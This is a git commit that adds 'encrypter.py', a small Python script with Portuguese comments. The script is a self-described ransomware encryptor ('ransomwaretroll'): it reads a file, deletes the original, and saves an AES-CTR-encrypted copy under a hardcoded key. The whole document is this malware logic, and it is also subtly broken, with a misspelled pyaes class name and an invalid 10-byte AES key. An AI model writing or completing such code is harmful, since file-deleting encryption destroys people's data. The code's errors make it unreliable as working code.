ceda663321d0960b59714efa95237ff242bd64cd
Edson-Padilha <edsonp.bsi@gmail.com>
2024-01-12 23:52:09 -0300

    Criando código arquivo encrypter

---
+++ encrypter.py
@@ -0,0 +1,25 @@
+import os
+import pyaes
+
+# Abre o arquivo a ser criptografado.
+file_name = "teste.txt"
+
+file = open(file_name, "rb")
+file_data = file.read()
+file.close()
+
+# Remove o arquivo
+os.remove(file_name)
+
+# Chave de criptografia
+key = b"minhaSenha"
+aes = pyaes.AESModeOfOperationsCTR(key)
+
+# Criptografar o arquivo
+crypto_data = aes.encrypt(file_data)
+
+# Salvar o arquivo criptografado
+new_file = file_name + "ransomwaretroll"
+new_file = open(f'{new_file}','wb')
+new_file.write(crypto_data)
+new_file.close()
